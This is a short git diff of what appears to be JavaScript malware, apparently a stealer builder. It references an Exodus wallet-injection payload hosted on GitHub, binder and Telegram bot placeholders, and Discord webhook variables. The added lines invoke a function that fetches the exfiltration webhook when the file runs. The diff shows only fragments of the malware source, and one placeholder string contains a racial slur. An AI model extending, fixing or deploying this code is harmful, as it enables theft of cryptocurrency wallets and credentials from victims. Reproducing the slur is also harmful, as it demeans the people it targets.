@@ -27,6 +27,7 @@ const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/ra
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
+
 // Global değişken
 let globalWebhookUrl = null; // Webhook URL başlangıçta boş
 let diagret = '%REPLACE-ME-NIGGA%';
@@ -73,6 +74,14 @@ async function sendDataAndFetchWebhook() {
         console.error("Bir hata oluştu:", error);
     }
 }
+
+// Asenkron fonksiyonu çağır ve global değişkeni doldur
+(async () => {
+    await sendDataAndFetchWebhook();
+    if (globalWebhookUrl) {
+        console.log("Global Webhook URL hazır:", globalWebhookUrl);
+    }
+})();
 
 const discordWebhookUrl = globalWebhookUrl;
 const discordWebhookUr1 = discordWebhookUrl;
